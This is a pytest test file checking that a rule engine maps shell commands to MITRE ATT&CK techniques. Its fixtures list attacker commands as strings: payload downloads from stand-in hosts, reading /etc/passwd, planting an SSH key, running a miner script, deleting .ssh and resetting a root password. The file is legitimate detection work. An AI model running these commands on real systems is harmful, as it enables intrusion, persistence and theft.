import pytest

from app.services.compaction import CompactedCommand
from app.services.mitre.catalog import is_known_technique, load_catalog
from app.services.mitre.rules import apply_rules, load_rules

POSITIVE = [
    ("wget http://198.51.100.7/x.sh", "T1105"),
    ("curl -O https://evil.example/payload", "T1105"),
    ("chmod 777 malicious_script", "T1222.002"),
    ("chmod +x payload", "T1222.002"),
    ("uname -a", "T1082"),
    ("cat /proc/cpuinfo", "T1082"),
    ("cat /etc/passwd", "T1003.008"),
    ('echo "ssh-rsa AAAA" >> .ssh/authorized_keys', "T1098.004"),
    ("sh setup_c3pool_miner.sh WALLET", "T1496"),
    ("rm -rf .ssh", "T1070.004"),
    ("ps aux", "T1057"),
    ("netstat -tulpn", "T1049"),
]

NEGATIVE = [
    ("echo wget is a tool", "T1105"),
    ("ls -la", "T1222.002"),
    ("cd /tmp", "T1082"),
    ("cat notes.txt", "T1003.008"),
]


def _hit_ids(command_text: str) -> set[str]:
    command = CompactedCommand(
        event_id="e1", timestamp="2026-08-20T10:00:00Z", command=command_text
    )
    hits, _ = apply_rules([command])
    return {h.rule.id for h in hits}


@pytest.mark.parametrize(("command", "technique"), POSITIVE)
def test_rule_matches_expected_command(command: str, technique: str) -> None:
    assert technique in _hit_ids(command)


@pytest.mark.parametrize(("command", "technique"), NEGATIVE)
def test_rule_does_not_over_match(command: str, technique: str) -> None:
    assert technique not in _hit_ids(command)


def test_every_rule_id_exists_in_the_attack_catalog() -> None:
    for rule in load_rules():
        assert is_known_technique(rule.id), f"{rule.id} is not a real ATT&CK technique"


def test_rule_names_and_tactics_match_the_catalog() -> None:
    catalog = load_catalog()
    for rule in load_rules():
        entry = catalog[rule.id]
        assert rule.tactic == entry.tactic, f"{rule.id} tactic drifted from catalog"


def test_unmatched_commands_are_returned_for_llm_gapfill() -> None:
    commands = [
        CompactedCommand(event_id="e1", timestamp="t", command="wget http://x/y"),
        CompactedCommand(event_id="e2", timestamp="t", command="dmidecode -s system-manufacturer"),
    ]
    hits, unmatched = apply_rules(commands)

    assert {h.rule.id for h in hits} == {"T1105"}
    assert [c.event_id for c in unmatched] == ["e2"]


def test_hits_carry_the_citing_event_id() -> None:
    commands = [
        CompactedCommand(
            event_id="seed-botnet-01-008",
            timestamp="2026-08-20T10:00:20Z",
            command="wget http://198.51.100.7/malicious_script",
        )
    ]
    hits, _ = apply_rules(commands)

    assert hits[0].event_id == "seed-botnet-01-008"
    assert hits[0].command == "wget http://198.51.100.7/malicious_script"


def test_reading_etc_passwd_is_not_mistaken_for_account_access_removal() -> None:
    """Regression: a bare `passwd` pattern also matches inside "/etc/passwd",
    which would wrongly tag a read-only recon command (T1003.008) with
    T1531 (Account Access Removal). Viewing the file is not disabling an
    account; only invoking the `passwd` command is.
    """
    assert _hit_ids("cat /etc/passwd") == {"T1003.008"}
    assert _hit_ids("cat /etc/passwd.bak") == {"T1003.008"}
    assert "T1531" in _hit_ids("passwd root")
    assert "T1531" in _hit_ids('echo -e "hacked123" | passwd')
